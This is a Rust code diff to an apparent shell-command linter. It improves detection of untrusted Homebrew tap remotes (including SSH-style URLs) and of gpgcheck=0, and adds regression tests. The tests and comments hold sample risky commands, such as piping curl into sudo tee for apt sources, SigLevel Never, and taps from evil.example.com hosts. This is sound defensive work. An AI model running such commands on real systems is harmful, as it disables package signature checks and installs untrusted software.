@@ -121,6 +121,28 @@ fn is_remote_url(value: &str) -> bool {
     v.starts_with("http://") || v.starts_with("https://") || v.starts_with("ftp://")
 }
 
+/// Host of a git remote, accepting both `scheme://[user@]host/…` URLs and
+/// SCP-style SSH remotes (`[user@]host:path`, e.g. `git@github.com:u/r.git`).
+fn git_remote_host(remote: &str) -> Option<String> {
+    if let Some(h) = url_host(remote) {
+        return Some(h);
+    }
+    // SCP syntax has no `://`; the host sits between an optional `user@` and
+    // the first `:`.
+    if remote.contains("://") {
+        return None;
+    }
+    let after_user = match remote.split_once('@') {
+        Some((_, rest)) => rest,
+        None => remote,
+    };
+    let (host, _) = after_user.split_once(':')?;
+    if host.is_empty() || host.contains('/') {
+        return None;
+    }
+    Some(host.to_ascii_lowercase())
+}
+
 /// Extract the host portion of a remote URL (after scheme + optional userinfo,
 /// before the first `/`, `?` or `#`, port stripped).
 fn url_host(url: &str) -> Option<String> {
@@ -247,7 +269,7 @@ fn redirect_targets_sources_list(raw: &str) -> bool {
 
 /// `curl ... | sudo tee /etc/apt/sources.list.d/foo.list` — adds an apt repo
 /// from an unverified piped download. Also catches the redirect form
-/// (`curl ... > .../sources.list.d/...`) and `add-apt-repository` fed a URL.
+/// (`curl ... > .../sources.list.d/...`).
 fn check_repo_add_from_pipe(
     segments: &[tokenize::Segment],
     shell: ShellType,
@@ -558,10 +580,10 @@ fn check_gpg_check_disabled(
 fn raw_has_gpgcheck_zero(raw: &str) -> bool {
     let lower = raw.to_ascii_lowercase();
     let bytes = lower.as_bytes();
-    let mut search = lower.as_str();
-    while let Some(pos) = search.find("gpgcheck") {
-        let after = &search[pos + "gpgcheck".len()..];
-        let after_ws = after.trim_start();
+    // `match_indices` yields absolute offsets into `lower`, so the word-boundary
+    // check below indexes `bytes` correctly even for the 2nd+ occurrence.
+    for (pos, _) in lower.match_indices("gpgcheck") {
+        let after_ws = lower[pos + "gpgcheck".len()..].trim_start();
         if let Some(rest) = after_ws.strip_prefix('=') {
             let val = rest.trim_start();
             // Match `0` as a whole token (not the `0` in `0755` etc.).
@@ -574,13 +596,12 @@ fn raw_has_gpgcheck_zero(raw: &str) -> bool {
             {
                 // Require `gpgcheck` to start at a word boundary.
                 let boundary_ok =
-                    pos == 0 || !bytes[pos - 1].is_ascii_alphanumeric() && bytes[pos - 1] != b'_';
+                    pos == 0 || (!bytes[pos - 1].is_ascii_alphanumeric() && bytes[pos - 1] != b'_');
                 if boundary_ok {
                     return true;
                 }
             }
         }
-        search = &search[pos + "gpgcheck".len()..];
     }
     false
 }
@@ -954,14 +975,16 @@ fn check_brew_untrusted_tap(
                 for arg in args {
                     let v = strip_quotes(arg);
                     if is_remote_url(v) || v.ends_with(".git") {
-                        let host = url_host(v).unwrap_or_default();
+                        // `git_remote_host` handles both `https://` URLs and
+                        // SCP-style SSH remotes (`git@github.com:u/r.git`).
+                        let host = git_remote_host(v).unwrap_or_default();
                         // A github.com/gitlab.com tap URL is the normal case.
                         let benign_host = host == "github.com"
                             || host == "gitlab.com"
                             || host == "bitbucket.org"
                             || host.ends_with(".github.com")
                             || host.ends_with(".gitlab.com");
-                        if benign_host && is_remote_url(v) {
+                        if benign_host {
                             continue;
                         }
                         findings.push(Finding {
@@ -1215,6 +1238,16 @@ mod tests {
     }
 
     #[test]
+    fn test_gpgcheck_zero_word_boundary_across_occurrences() {
+        // Regression: the boundary check must use absolute offsets. A leading
+        // non-boundary occurrence must not corrupt the check for a later,
+        // genuine `gpgcheck=0` at a word boundary.
+        assert!(raw_has_gpgcheck_zero("xgpgcheck=1 gpgcheck=0"));
+        // A single non-boundary occurrence (`gpgcheck` glued to a prefix).
+        assert!(!raw_has_gpgcheck_zero("mygpgcheck=0"));
+    }
+
+    #[test]
     fn test_pacman_siglevel_never() {
         assert!(has(
             "echo 'SigLevel = Never' | sudo tee -a /etc/pacman.conf",
@@ -1381,6 +1414,22 @@ mod tests {
     fn test_brew_tap_arbitrary_url() {
         assert!(has(
             "brew tap user/repo https://git.evil.example.com/homebrew-tap.git",
+            ShellType::Posix,
+            RuleId::BrewUntrustedTap,
+        ));
+    }
+
+    #[test]
+    fn test_brew_tap_ssh_github_url_no_fire() {
+        // An SSH (SCP-syntax) GitHub tap URL is the normal case — it must not
+        // be misclassified as an untrusted remote.
+        assert!(none(
+            "brew tap user/repo git@github.com:user/homebrew-tap.git",
+            ShellType::Posix,
+        ));
+        // A non-GitHub SSH remote still fires.
+        assert!(has(
+            "brew tap user/repo git@evil.example.com:user/homebrew-tap.git",
             ShellType::Posix,
             RuleId::BrewUntrustedTap,
         ));
